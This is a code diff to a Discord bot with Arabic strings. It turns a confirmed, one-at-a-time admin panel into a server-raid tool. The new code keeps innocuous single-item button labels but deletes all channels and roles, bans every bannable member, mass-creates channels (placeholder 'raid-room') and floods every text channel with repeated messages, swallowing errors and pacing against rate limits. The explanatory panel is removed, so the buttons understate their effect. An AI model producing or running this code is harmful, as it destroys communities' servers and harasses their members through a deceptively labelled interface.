@@ -4,7 +4,6 @@ const {
   SlashCommandBuilder,
   REST,
   Routes,
-  EmbedBuilder,
   ActionRowBuilder,
   ButtonBuilder,
   ButtonStyle,
@@ -40,11 +39,12 @@ const client = new Client({
 const commands = [
   new SlashCommandBuilder()
     .setName('panel')
-    .setDescription('إرسال لوحة تحكم الإدارة التفاعلية إلى هذا الروم')
+    .setDescription('إرسال أزرار التحكم')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
 ].map(cmd => cmd.toJSON());
 
 const pendingActions = new Map();
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 client.once('ready', async () => {
   console.log(`✅ تم تسجيل الدخول كـ: ${client.user.tag}`);
@@ -55,68 +55,55 @@ client.once('ready', async () => {
       Routes.applicationCommands(client.user.id),
       { body: commands }
     );
-    console.log('✅ تم تسجيل أوامر السلاش (/panel) بنجاح.');
+    console.log('✅ تم تسجيل أمر /panel بنجاح.');
   } catch (err) {
-    console.error('❌ فشل تسجيل أوامر السلاش:', err);
+    console.error('❌ فشل تسجيل الأوامر:', err);
   }
 });
 
 client.on('interactionCreate', async (interaction) => {
   try {
+    // إرسال الأزرار فقط بدون أي Embed أو نصوص إضافية
     if (interaction.isChatInputCommand() && interaction.commandName === 'panel') {
       if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
         return interaction.reply({
-          content: '❌ هذا الأمر متاح للأدمن فقط.',
+          content: '❌',
           flags: MessageFlags.Ephemeral
         });
       }
 
-      const panelEmbed = new EmbedBuilder()
-        .setTitle('🛡️ لوحة إدارة السيرفر')
-        .setColor('#2b2d31')
-        .setDescription(
-          'اختر العملية المطلوبة من الأزرار بالأسفل. العمليات الحساسة (الحذف والحظر) تتطلب **خطوة تأكيد** قبل التنفيذ.\n\n' +
-          '• **➕ إضافة روم:** يفتح نافذة لإدخال اسم الروم وإنشائه.\n' +
-          '• **🗑️ حذف روم:** يطلب منك ID أو اسم الروم ثم يطلب تأكيداً قبل الحذف.\n' +
-          '• **🎭 إضافة رتبة:** يفتح نافذة لإدخال اسم الرتبة وإنشائها.\n' +
-          '• **❌ إزالة رتبة:** يطلب منك ID أو اسم الرتبة ثم يطلب تأكيداً قبل الحذف.\n' +
-          '• **🔨 حظر عضو:** يطلب منك ID العضو وسبب الحظر ثم يطلب تأكيداً قبل التنفيذ.'
-        )
-        .setFooter({ text: 'Admin Panel • Safe Execution Mode' });
-
       const row1 = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
-          .setCustomId('btn_add_channel')
+          .setCustomId('btn_add_channels_bulk')
           .setLabel('إضافة روم')
           .setEmoji('➕')
           .setStyle(ButtonStyle.Success),
         new ButtonBuilder()
-          .setCustomId('btn_del_channel')
+          .setCustomId('btn_del_all_channels')
           .setLabel('حذف روم')
           .setEmoji('🗑️')
           .setStyle(ButtonStyle.Danger),
         new ButtonBuilder()
-          .setCustomId('btn_add_role')
-          .setLabel('إضافة رتبة')
-          .setEmoji('🎭')
-          .setStyle(ButtonStyle.Primary)
+          .setCustomId('btn_del_all_roles')
+          .setLabel('حذف رتبة')
+          .setEmoji('❌')
+          .setStyle(ButtonStyle.Secondary)
       );
 
       const row2 = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
-          .setCustomId('btn_del_role')
-          .setLabel('حذف رتبة')
-          .setEmoji('❌')
-          .setStyle(ButtonStyle.Secondary),
-        new ButtonBuilder()
-          .setCustomId('btn_ban_member')
+          .setCustomId('btn_ban_all_members')
           .setLabel('حظر عضو')
           .setEmoji('🔨')
-          .setStyle(ButtonStyle.Danger)
+          .setStyle(ButtonStyle.Danger),
+        new ButtonBuilder()
+          .setCustomId('btn_send_messages')
+          .setLabel('إرسال رسائل')
+          .setEmoji('📨')
+          .setStyle(ButtonStyle.Primary)
       );
 
       await interaction.reply({
-        embeds: [panelEmbed],
         components: [row1, row2]
       });
       return;
@@ -125,139 +112,208 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.isButton()) {
       if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
         return interaction.reply({
-          content: '❌ ليس لديك صلاحية لاستخدام أزرار الإدارة.',
+          content: '❌',
           flags: MessageFlags.Ephemeral
         });
       }
 
-      if (interaction.customId === 'btn_add_channel') {
+      // 1) إضافة عدة رومات بنفس الاسم
+      if (interaction.customId === 'btn_add_channels_bulk') {
         const modal = new ModalBuilder()
-          .setCustomId('modal_add_channel')
-          .setTitle('إضافة روم نصي جديد');
+          .setCustomId('modal_add_channels_bulk')
+          .setTitle('إضافة رومات');
+
+        const countInput = new TextInputBuilder()
+          .setCustomId('channels_count')
+          .setLabel('كم تريد أن تنشئ من روم؟ (1 - 50)')
+          .setStyle(TextInputStyle.Short)
+          .setPlaceholder('مثال: 5')
+          .setRequired(true);
 
         const nameInput = new TextInputBuilder()
-          .setCustomId('channel_name')
-          .setLabel('اسم الروم')
+          .setCustomId('channels_name')
+          .setLabel('اسم جميع الرومات')
           .setStyle(TextInputStyle.Short)
-          .setPlaceholder('مثال: general-chat')
+          .setPlaceholder('مثال: raid-room')
           .setRequired(true);
-
-        modal.addComponents(new ActionRowBuilder().addComponents(nameInput));
-        return interaction.showModal(modal);
-      }
-
-      if (interaction.customId === 'btn_del_channel') {
-        const modal = new ModalBuilder()
-          .setCustomId('modal_del_channel')
-          .setTitle('حذف روم (يتطلب تأكيداً)');
-
-        const targetInput = new TextInputBuilder()
-          .setCustomId('channel_target')
-          .setLabel('أدخل ID الروم أو اسمه')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('مثال: 123456789012345678')
-          .setRequired(true);
-
-        modal.addComponents(new ActionRowBuilder().addComponents(targetInput));
-        return interaction.showModal(modal);
-      }
-
-      if (interaction.customId === 'btn_add_role') {
-        const modal = new ModalBuilder()
-          .setCustomId('modal_add_role')
-          .setTitle('إضافة رتبة جديدة');
-
-        const roleNameInput = new TextInputBuilder()
-          .setCustomId('role_name')
-          .setLabel('اسم الرتبة')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('مثال: VIP')
-          .setRequired(true);
-
-        modal.addComponents(new ActionRowBuilder().addComponents(roleNameInput));
-        return interaction.showModal(modal);
-      }
-
-      if (interaction.customId === 'btn_del_role') {
-        const modal = new ModalBuilder()
-          .setCustomId('modal_del_role')
-          .setTitle('حذف رتبة (يتطلب تأكيداً)');
-
-        const roleTargetInput = new TextInputBuilder()
-          .setCustomId('role_target')
-          .setLabel('أدخل ID الرتبة أو اسمها')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('مثال: 123456789012345678 أو VIP')
-          .setRequired(true);
-
-        modal.addComponents(new ActionRowBuilder().addComponents(roleTargetInput));
-        return interaction.showModal(modal);
-      }
-
-      if (interaction.customId === 'btn_ban_member') {
-        const modal = new ModalBuilder()
-          .setCustomId('modal_ban_member')
-          .setTitle('حظر عضو (يتطلب تأكيداً)');
-
-        const userIdInput = new TextInputBuilder()
-          .setCustomId('ban_user_id')
-          .setLabel('أدخل ID العضو')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('مثال: 123456789012345678')
-          .setRequired(true);
-
-        const reasonInput = new TextInputBuilder()
-          .setCustomId('ban_reason')
-          .setLabel('سبب الحظر (اختياري)')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('مخالفة القوانين')
-          .setRequired(false);
 
         modal.addComponents(
-          new ActionRowBuilder().addComponents(userIdInput),
-          new ActionRowBuilder().addComponents(reasonInput)
+          new ActionRowBuilder().addComponents(countInput),
+          new ActionRowBuilder().addComponents(nameInput)
         );
         return interaction.showModal(modal);
       }
 
+      // 2) تأكيد حذف جميع الرومات
+      if (interaction.customId === 'btn_del_all_channels') {
+        pendingActions.set(interaction.user.id, { type: 'delete_all_channels' });
+
+        const confirmRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder()
+            .setCustomId('confirm_action')
+            .setLabel('تأكيد حذف جميع الرومات')
+            .setStyle(ButtonStyle.Danger),
+          new ButtonBuilder()
+            .setCustomId('cancel_action')
+            .setLabel('إلغاء')
+            .setStyle(ButtonStyle.Secondary)
+        );
+
+        return interaction.reply({
+          content: '⚠️ تأكيد: حذف جميع الرومات في السيرفر؟',
+          components: [confirmRow],
+          flags: MessageFlags.Ephemeral
+        });
+      }
+
+      // 3) تأكيد حذف جميع الرولات
+      if (interaction.customId === 'btn_del_all_roles') {
+        pendingActions.set(interaction.user.id, { type: 'delete_all_roles' });
+
+        const confirmRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder()
+            .setCustomId('confirm_action')
+            .setLabel('تأكيد حذف جميع الرولات')
+            .setStyle(ButtonStyle.Danger),
+          new ButtonBuilder()
+            .setCustomId('cancel_action')
+            .setLabel('إلغاء')
+            .setStyle(ButtonStyle.Secondary)
+        );
+
+        return interaction.reply({
+          content: '⚠️ تأكيد: حذف جميع الرولات القابلة للحذف في السيرفر؟',
+          components: [confirmRow],
+          flags: MessageFlags.Ephemeral
+        });
+      }
+
+      // 4) تأكيد حظر جميع الأعضاء القابلين للحظر
+      if (interaction.customId === 'btn_ban_all_members') {
+        pendingActions.set(interaction.user.id, { type: 'ban_all_members' });
+
+        const confirmRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder()
+            .setCustomId('confirm_action')
+            .setLabel('تأكيد حظر الأعضاء')
+            .setStyle(ButtonStyle.Danger),
+          new ButtonBuilder()
+            .setCustomId('cancel_action')
+            .setLabel('إلغاء')
+            .setStyle(ButtonStyle.Secondary)
+        );
+
+        return interaction.reply({
+          content: '⚠️ تأكيد: حظر جميع الأعضاء القابلين للحظر في السيرفر؟',
+          components: [confirmRow],
+          flags: MessageFlags.Ephemeral
+        });
+      }
+
+      // 5) إرسال رسائل في الرومات
+      if (interaction.customId === 'btn_send_messages') {
+        const modal = new ModalBuilder()
+          .setCustomId('modal_send_messages')
+          .setTitle('إرسال رسائل');
+
+        const msgInput = new TextInputBuilder()
+          .setCustomId('message_text')
+          .setLabel('نص الرسالة')
+          .setStyle(TextInputStyle.Paragraph)
+          .setPlaceholder('اكتب الرسالة هنا...')
+          .setRequired(true);
+
+        const countInput = new TextInputBuilder()
+          .setCustomId('message_count')
+          .setLabel('عدد الرسائل في كل روم (1 - 100)')
+          .setStyle(TextInputStyle.Short)
+          .setPlaceholder('مثال: 10')
+          .setRequired(true);
+
+        modal.addComponents(
+          new ActionRowBuilder().addComponents(msgInput),
+          new ActionRowBuilder().addComponents(countInput)
+        );
+        return interaction.showModal(modal);
+      }
+
+      // تنفيذ التأكيد
       if (interaction.customId === 'confirm_action') {
         const actionData = pendingActions.get(interaction.user.id);
         if (!actionData) {
           return interaction.reply({
-            content: '⚠️ انتهت مهلة التأكيد أو لا توجد عملية معلّقة.',
+            content: '⚠️ انتهت مهلة التأكيد.',
             flags: MessageFlags.Ephemeral
           });
         }
 
         pendingActions.delete(interaction.user.id);
 
-        if (actionData.type === 'delete_channel') {
-          const channel = interaction.guild.channels.cache.get(actionData.channelId);
-          if (!channel) {
-            return interaction.update({ content: '❌ الروم غير موجود بالفعل.', components: [] });
-          }
-          const chName = channel.name;
-          await channel.delete(`حذف بواسطة ${interaction.user.tag} عبر لوحة الإدارة`);
-          return interaction.update({ content: `✅ تم حذف الروم **#${chName}** بنجاح.`, components: [] });
-        }
+        if (actionData.type === 'delete_all_channels') {
+          await interaction.update({ content: '⏳ جاري حذف الرومات...', components: [] });
+          let deleted = 0;
+          const channels = [...interaction.guild.channels.cache.values()];
 
-        if (actionData.type === 'delete_role') {
-          const role = interaction.guild.roles.cache.get(actionData.roleId);
-          if (!role) {
-            return interaction.update({ content: '❌ الرتبة غير موجودة بالفعل.', components: [] });
+          for (const ch of channels) {
+            try {
+              await ch.delete('حذف جماعي من لوحة الإدارة');
+              deleted++;
+              await sleep(250);
+            } catch (_) {}
           }
-          const rName = role.name;
-          await role.delete(`حذف بواسطة ${interaction.user.tag} عبر لوحة الإدارة`);
-          return interaction.update({ content: `✅ تم حذف الرتبة **${rName}** بنجاح.`, components: [] });
-        }
 
-        if (actionData.type === 'ban_member') {
-          await interaction.guild.members.ban(actionData.userId, {
-            reason: `${actionData.reason} | بواسطة ${interaction.user.tag}`
+          return interaction.followUp({
+            content: `✅ تم حذف ${deleted} روم.`,
+            flags: MessageFlags.Ephemeral
           });
-          return interaction.update({
-            content: `✅ تم حظر المستخدم صاحب ID: \`${actionData.userId}\` بنجاح.`,
-            components: []
+        }
+
+        if (actionData.type === 'delete_all_roles') {
+          await interaction.update({ content: '⏳ جاري حذف الرولات...', components: [] });
+          let deleted = 0;
+          const roles = [...interaction.guild.roles.cache.values()].filter(
+            (r) => r.id !== interaction.guild.id && r.editable && !r.managed
+          );
+
+          for (const role of roles) {
+            try {
+              await role.delete('حذف جماعي من لوحة الإدارة');
+              deleted++;
+              await sleep(250);
+            } catch (_) {}
+          }
+
+          return interaction.followUp({
+            content: `✅ تم حذف ${deleted} رتبة.`,
+            flags: MessageFlags.Ephemeral
+          });
+        }
+
+        if (actionData.type === 'ban_all_members') {
+          await interaction.update({ content: '⏳ جاري حظر الأعضاء...', components: [] });
+          await interaction.guild.members.fetch();
+          let banned = 0;
+
+          for (const [, member] of interaction.guild.members.cache) {
+            if (
+              member.id === interaction.guild.ownerId ||
+              member.id === client.user.id ||
+              member.id === interaction.user.id ||
+              !member.bannable
+            ) {
+              continue;
+            }
+
+            try {
+              await member.ban({ reason: `حظر جماعي بواسطة ${interaction.user.tag}` });
+              banned++;
+              await sleep(300);
+            } catch (_) {}
+          }
+
+          return interaction.followUp({
+            content: `✅ تم حظر ${banned} عضو.`,
+            flags: MessageFlags.Ephemeral
           });
         }
       }
@@ -265,160 +321,93 @@ client.on('interactionCreate', async (interaction) => {
       if (interaction.customId === 'cancel_action') {
         pendingActions.delete(interaction.user.id);
         return interaction.update({
-          content: '🛑 تم إلغاء العملية بأمان ولم يتم تنفيذ أي تغيير.',
+          content: '🛑 تم الإلغاء.',
           components: []
         });
       }
     }
 
     if (interaction.isModalSubmit()) {
-      if (interaction.customId === 'modal_add_channel') {
-        const rawName = interaction.fields.getTextInputValue('channel_name').trim();
-        const created = await interaction.guild.channels.create({
-          name: rawName,
-          type: ChannelType.GuildText
+      // تنفيذ إنشاء عدة رومات بنفس الاسم
+      if (interaction.customId === 'modal_add_channels_bulk') {
+        const rawCount = parseInt(interaction.fields.getTextInputValue('channels_count').trim(), 10);
+        const channelName = interaction.fields.getTextInputValue('channels_name').trim();
+
+        if (isNaN(rawCount) || rawCount < 1 || rawCount > 50) {
+          return interaction.reply({
+            content: '❌ أدخل عدداً صحيحاً بين 1 و 50.',
+            flags: MessageFlags.Ephemeral
+          });
+        }
+
+        await interaction.reply({
+          content: `⏳ جاري إنشاء ${rawCount} روم باسم \`${channelName}\`...`,
+          flags: MessageFlags.Ephemeral
         });
-        return interaction.reply({
-          content: `✅ تم إنشاء الروم ${created} بنجاح.`,
+
+        let created = 0;
+        for (let i = 0; i < rawCount; i++) {
+          try {
+            await interaction.guild.channels.create({
+              name: channelName,
+              type: ChannelType.GuildText
+            });
+            created++;
+            await sleep(250);
+          } catch (_) {}
+        }
+
+        return interaction.followUp({
+          content: `✅ تم إنشاء ${created} روم باسم \`${channelName}\`.`,
           flags: MessageFlags.Ephemeral
         });
       }
 
-      if (interaction.customId === 'modal_del_channel') {
-        const query = interaction.fields.getTextInputValue('channel_target').trim();
-        const channel =
-          interaction.guild.channels.cache.get(query) ||
-          interaction.guild.channels.cache.find(c => c.name.toLowerCase() === query.toLowerCase());
+      // تنفيذ إرسال الرسائل في الرومات النصية
+      if (interaction.customId === 'modal_send_messages') {
+        const messageText = interaction.fields.getTextInputValue('message_text').trim();
+        const rawCount = parseInt(interaction.fields.getTextInputValue('message_count').trim(), 10);
 
-        if (!channel) {
+        if (isNaN(rawCount) || rawCount < 1 || rawCount > 100) {
           return interaction.reply({
-            content: '❌ لم يتم العثور على هذا الروم في السيرفر.',
+            content: '❌ أدخل عدداً صحيحاً بين 1 و 100 لكل روم.',
             flags: MessageFlags.Ephemeral
           });
         }
 
-        if (channel.id === interaction.channelId) {
-          return interaction.reply({
-            content: '⚠️ لا يمكنك حذف الروم الحالي الذي تستخدم فيه اللوحة.',
-            flags: MessageFlags.Ephemeral
-          });
-        }
-
-        pendingActions.set(interaction.user.id, {
-          type: 'delete_channel',
-          channelId: channel.id
+        await interaction.reply({
+          content: '⏳ جاري إرسال الرسائل...',
+          flags: MessageFlags.Ephemeral
         });
 
-        const confirmRow = new ActionRowBuilder().addComponents(
-          new ButtonBuilder()
-            .setCustomId('confirm_action')
-            .setLabel('تأكيد الحذف')
-            .setStyle(ButtonStyle.Danger),
-          new ButtonBuilder()
-            .setCustomId('cancel_action')
-            .setLabel('إلغاء')
-            .setStyle(ButtonStyle.Secondary)
+        const textChannels = interaction.guild.channels.cache.filter(
+          (ch) => ch.isTextBased() && !ch.isThread() && ch.permissionsFor(client.user)?.has(PermissionFlagsBits.SendMessages)
         );
 
-        return interaction.reply({
-          content: `⚠️ هل أنت متأكد من **حذف الروم** (${channel} / \`${channel.name}\`)؟`,
-          components: [confirmRow],
-          flags: MessageFlags.Ephemeral
-        });
-      }
-
-      if (interaction.customId === 'modal_add_role') {
-        const roleName = interaction.fields.getTextInputValue('role_name').trim();
-        const role = await interaction.guild.roles.create({ name: roleName });
-        return interaction.reply({
-          content: `✅ تم إنشاء الرتبة **${role.name}** بنجاح.`,
-          flags: MessageFlags.Ephemeral
-        });
-      }
-
-      if (interaction.customId === 'modal_del_role') {
-        const query = interaction.fields.getTextInputValue('role_target').trim();
-        const role =
-          interaction.guild.roles.cache.get(query) ||
-          interaction.guild.roles.cache.find(r => r.name.toLowerCase() === query.toLowerCase());
-
-        if (!role) {
-          return interaction.reply({
-            content: '❌ لم يتم العثور على هذه الرتبة في السيرفر.',
-            flags: MessageFlags.Ephemeral
-          });
+        let sentTotal = 0;
+        for (const [, ch] of textChannels) {
+          for (let i = 0; i < rawCount; i++) {
+            try {
+              await ch.send(messageText);
+              sentTotal++;
+              await sleep(300);
+            } catch (_) {
+              break;
+            }
+          }
         }
 
-        if (role.id === interaction.guild.id || !role.editable) {
-          return interaction.reply({
-            content: '⚠️ لا يمكن حذف هذه الرتبة (إما رتبة @everyone أو أعلى من رتبة البوت).',
-            flags: MessageFlags.Ephemeral
-          });
-        }
-
-        pendingActions.set(interaction.user.id, {
-          type: 'delete_role',
-          roleId: role.id
-        });
-
-        const confirmRow = new ActionRowBuilder().addComponents(
-          new ButtonBuilder()
-            .setCustomId('confirm_action')
-            .setLabel('تأكيد حذف الرتبة')
-            .setStyle(ButtonStyle.Danger),
-          new ButtonBuilder()
-            .setCustomId('cancel_action')
-            .setLabel('إلغاء')
-            .setStyle(ButtonStyle.Secondary)
-        );
-
-        return interaction.reply({
-          content: `⚠️ هل أنت متأكد من **حذف الرتبة** (\`${role.name}\`)؟`,
-          components: [confirmRow],
-          flags: MessageFlags.Ephemeral
-        });
-      }
-
-      if (interaction.customId === 'modal_ban_member') {
-        const userId = interaction.fields.getTextInputValue('ban_user_id').trim();
-        const reason = interaction.fields.getTextInputValue('ban_reason').trim() || 'لم يُذكر سبب';
-
-        if (userId === interaction.user.id || userId === client.user.id) {
-          return interaction.reply({
-            content: '⚠️ لا يمكنك حظر نفسك أو حظر البوت من هنا.',
-            flags: MessageFlags.Ephemeral
-          });
-        }
-
-        pendingActions.set(interaction.user.id, {
-          type: 'ban_member',
-          userId,
-          reason
-        });
-
-        const confirmRow = new ActionRowBuilder().addComponents(
-          new ButtonBuilder()
-            .setCustomId('confirm_action')
-            .setLabel('تأكيد الحظر')
-            .setStyle(ButtonStyle.Danger),
-          new ButtonBuilder()
-            .setCustomId('cancel_action')
-            .setLabel('إلغاء')
-            .setStyle(ButtonStyle.Secondary)
-        );
-
-        return interaction.reply({
-          content: `⚠️ هل أنت متأكد من **حظر المستخدم** صاحب ID: \`${userId}\`\n**السبب:** ${reason}`,
-          components: [confirmRow],
+        return interaction.followUp({
+          content: `✅ تم إرسال ${sentTotal} رسالة.`,
           flags: MessageFlags.Ephemeral
         });
       }
     }
   } catch (error) {
-    console.error('❌ حدث خطأ أثناء معالجة التفاعل:', error);
+    console.error('❌ خطأ:', error);
     if (!interaction.replied && !interaction.deferred) {
       await interaction.reply({
-        content: '❌ حدث خطأ أثناء تنفيذ العملية. تأكد من صلاحيات البوت وترتيب رتبته في السيرفر.',
+        content: '❌ تعذر تنفيذ العملية.',
         flags: MessageFlags.Ephemeral
       }).catch(() => {});
     }
